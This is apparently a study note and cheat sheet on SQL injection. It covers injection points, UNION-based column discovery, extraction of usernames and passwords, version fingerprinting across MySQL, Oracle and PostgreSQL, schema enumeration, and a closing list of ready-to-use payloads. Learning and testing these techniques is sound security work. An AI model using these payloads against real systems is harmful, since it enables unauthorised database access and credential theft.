# SQL Injection

**Definition**: Web security vulnerability that allows interfering with database queries.

## Common Locations

- `WHERE` clause in `SELECT`
    
- `UPDATE` statements (values/`WHERE`)
    
- `INSERT` statements (values)
    
- `SELECT` (table/column names)
    
- `SELECT` (`ORDER BY` clause)
    

## Basic Examples

Original:  
`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`

Injected:  
`SELECT * FROM products WHERE category = 'Gifts' OR '1'='1' -- AND released = 1`

## UNION Attacks

Append additional queries:  
`SELECT a, b FROM table1 UNION SELECT c, d FROM table2`

### Techniques

1. **Find column count**:  
    `' UNION SELECT NULL--` (Oracle: `' UNION SELECT NULL FROM DUAL--`)
    
2. **Check column types**:  
    `' UNION SELECT NULL,'a',NULL,NULL--`
    
3. **Steal data**:  
    `'UNION SELECT username,password FROM users--`
    
4. **Combine fields**:  
    `' UNION SELECT username||'~'||password FROM users--`
    

## Database Version

- **MySQL/MSSQL**: `' UNION SELECT @@version--`
    
- **Oracle**: `' UNION SELECT * FROM v$version--`
    
- **PostgreSQL**: `' UNION SELECT version()--`
    

## Database Enumeration

1. **List tables**:  
    `SELECT * FROM information_schema.tables`
    
2. **List columns**:  
    `SELECT * FROM information_schema.columns WHERE table_name='Users'`
    
3. **Practical injection**:  
    `' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='Users'--`
    

## Blind SQLi

- Exploit via conditional responses (e.g., `AND 1=1`, `AND 1=2`)
    

## Payload Cheatsheet


```
OR '1'='1' --  
OR '1'='1' #  
UNION SELECT NULL--  
' UNION SELECT @@version--  
' UNION SELECT table_name FROM information_schema.tables--  
```